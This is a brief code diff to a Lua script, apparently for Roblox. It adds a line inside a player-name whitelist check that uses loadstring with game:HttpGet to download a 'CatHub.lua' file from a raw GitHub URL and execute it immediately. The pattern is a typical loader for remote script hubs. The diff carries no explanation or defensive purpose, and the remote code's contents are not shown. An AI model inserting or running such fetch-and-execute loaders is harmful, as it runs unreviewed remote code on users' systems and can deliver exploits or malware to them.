@@ -5,7 +5,7 @@ local validNames = { "lYESIL", "abcdefyou210", "Ejderkafai_YT" }
 
 for _, name in ipairs(validNames) do
     if PlayerName == name then
-            
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/CatHead132/CatHub/main/CatHub.lua'))()
         break
     end
 end
